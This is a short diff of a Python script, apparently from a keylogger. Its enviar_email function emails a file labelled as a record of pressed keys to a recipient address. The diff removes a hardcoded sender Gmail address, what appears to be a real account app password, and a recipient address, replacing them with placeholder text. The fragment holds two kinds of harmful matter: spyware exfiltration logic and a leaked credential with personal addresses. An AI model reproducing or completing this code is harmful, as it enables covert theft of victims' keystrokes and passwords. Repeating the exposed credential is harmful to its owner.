@@ -30,9 +30,9 @@ def attach_file(message, filepath):
         message.add_attachment(fp.read(), maintype=main_type, subtype=sub_type, filename=filepath)
 
 def enviar_email():
-    emailEnvia = "destripador.30001@gmail.com"
-    password = "mulv ijdb zbgd dffv"
-    correo = "juanesvalon02@gmail.com"
+    emailEnvia = "Add the email to Send"
+    password = "Add the email password"
+    correo = "Add the email to Receive"
     titulo = "Registro de teclas"
     body = "Archivo con teclas pulsadas"
 
